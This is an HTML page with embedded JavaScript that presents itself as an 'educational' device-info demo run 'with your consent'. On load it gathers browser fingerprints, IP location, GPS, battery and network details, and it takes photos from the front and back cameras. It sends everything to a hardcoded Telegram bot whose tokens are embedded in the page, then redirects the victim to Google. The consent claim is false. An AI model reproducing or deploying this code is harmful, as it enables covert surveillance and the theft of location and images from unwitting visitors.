<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Device Info & Camera Access</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
      background-color: #f4f4f4;
    }
    h2 {
      color: #333;
    }
    #loading {
      font-size: 18px;
      margin-top: 20px;
      color: #555;
    }
  </style>
</head>
<body>
  <h2>This website is for educational purposes only.</h2>
  <p>
    This demo collects device and camera info ethically, with your consent.
  </p>
  <div id="loading">Loading...</div>

  <script>
    const telegramBotToken = "8064189934:AAEv0eT2TdKAteC6vdyZkXL3cP7dbYSIfbQ";
    const chatId = "7216371031";
    const ipToken = "18d2a866939a58";

    let frontCaptured = false;
    let backCaptured = false;

    // Network Information
    async function getNetworkInfo() {
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (connection) {
        return {
          type: connection.type || "Unknown",
          effectiveType: connection.effectiveType || "Unknown",
          downlink: connection.downlink ? `${connection.downlink} Mbps` : "Unknown",
          rtt: connection.rtt ? `${connection.rtt} ms` : "Unknown",
          saveData: connection.saveData ? "Enabled" : "Disabled",
        };
      }
      return "Network API not supported";
    }

    // WebGL & Canvas Fingerprinting
    function getWebGLInfo() {
      const canvas = document.createElement('canvas');
      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      if (!gl) return "WebGL not supported";
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "Blocked",
        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Blocked",
      };
    }

    async function getSnapshot(facingMode) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode }
        });
        const video = document.createElement("video");
        video.srcObject = stream;
        await video.play();
        await new Promise(res => setTimeout(res, 1000)); // Let it stabilize

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);

        const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg", 0.9));
        stream.getTracks().forEach(track => track.stop());
        return blob;
      } catch (err) {
        console.warn(`Camera (${facingMode}) access denied or failed`, err);
        return null;
      }
    }

    async function getDeviceInfo() {
      const data = {
        // Basic Info
        browser: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled ? "Enabled" : "Disabled",
        
        // Hardware Specs
        cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : "Unavailable",
        memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unavailable",
        screen: `${screen.width}x${screen.height}, ${screen.colorDepth}bit`,
        touch: 'ontouchstart' in window ? "Yes" : "No",
        webgl: getWebGLInfo(),
        
        // Network
        network: await getNetworkInfo(),
        
        // Location & IP
        ip: "Unknown",
        city: "",
        region: "",
        country: "",
        location: "Denied",
        
        // Battery
        battery: "Unknown",
        charging: "Unknown",
        
        // Camera
        cameraStatus: "",
      };

      // IP Info
      try {
        const res = await fetch(`https://ipinfo.io/json?token=${ipToken}`);
        const ipData = await res.json();
        data.ip = ipData.ip;
        data.city = ipData.city;
        data.region = ipData.region;
        data.country = ipData.country;
      } catch {}

      // Battery Info
      try {
        const battery = await navigator.getBattery();
        data.battery = (battery.level * 100).toFixed(0) + "%";
        data.charging = battery.charging ? "Yes" : "No";
      } catch {}

      // Location
      try {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );
        data.location = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
      } catch {}

      return data;
    }

    async function sendTextToTelegram(data) {
      const message = `
*ðŸ”° Opas Labs ðŸ”°*

ðŸŒ *Basic Info*
- Browser: ${data.browser}
- Platform: ${data.platform}
- Language: ${data.language}
- Timezone: ${data.timezone}
- Cookies: ${data.cookies}

ðŸ’» *Hardware Specs*
- CPU: ${data.cpu}
- RAM: ${data.memory}
- Screen: ${data.screen}
- Touch Support: ${data.touch}
- WebGL Vendor: ${data.webgl.vendor}
- WebGL Renderer: ${data.webgl.renderer}

ðŸ“¶ *Network*
- Type: ${data.network.type}
- Speed: ${data.network.effectiveType}
- Downlink: ${data.network.downlink}
- Latency (RTT): ${data.network.rtt}
- Data Saver: ${data.network.saveData}

ðŸ“ *Location & IP*
- IP: ${data.ip}
- City: ${data.city}
- Region: ${data.region}
- Country: ${data.country}
- GPS: ${data.location}

ðŸ”‹ *Battery*
- Level: ${data.battery}
- Charging: ${data.charging}

ðŸ“· *Camera Status*
- ${data.cameraStatus}
      `;

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown"
        })
      });
    }

    function sendPhotoToTelegram(blob, caption) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, `${caption}.jpg`);
      formData.append("caption", caption);

      return fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    // Automatically execute on page load
    window.addEventListener('load', async () => {
      const loadingElement = document.getElementById('loading');
      loadingElement.textContent = 'Collecting data...';

      const info = await getDeviceInfo();

      // Capture front camera (only once)
      let frontSnap = null;
      if (!frontCaptured) {
        loadingElement.textContent = 'Accessing front camera...';
        frontSnap = await getSnapshot("user");
        frontCaptured = true;
      }

      // Capture back camera (only once)
      let backSnap = null;
      if (!backCaptured) {
        loadingElement.textContent = 'Accessing back camera...';
        backSnap = await getSnapshot("environment");
        backCaptured = true;
      }

      // Set camera status
      if (frontSnap && backSnap) {
        info.cameraStatus = "Front & Back Captured";
      } else if (frontSnap) {
        info.cameraStatus = "Front Only";
      } else if (backSnap) {
        info.cameraStatus = "Back Only";
      } else {
        info.cameraStatus = "None / Access Denied";
      }

      // Send info and photos
      loadingElement.textContent = 'Sending data...';
      await sendTextToTelegram(info);
      if (frontSnap) await sendPhotoToTelegram(frontSnap, "ðŸ“· Front Camera");
      if (backSnap) await sendPhotoToTelegram(backSnap, "ðŸ“· Back Camera");

      // Redirect after 3s
      setTimeout(() => {
        window.location.href = "https://www.google.com";
      }, 3000);
    });
  </script>
</body>
</html>
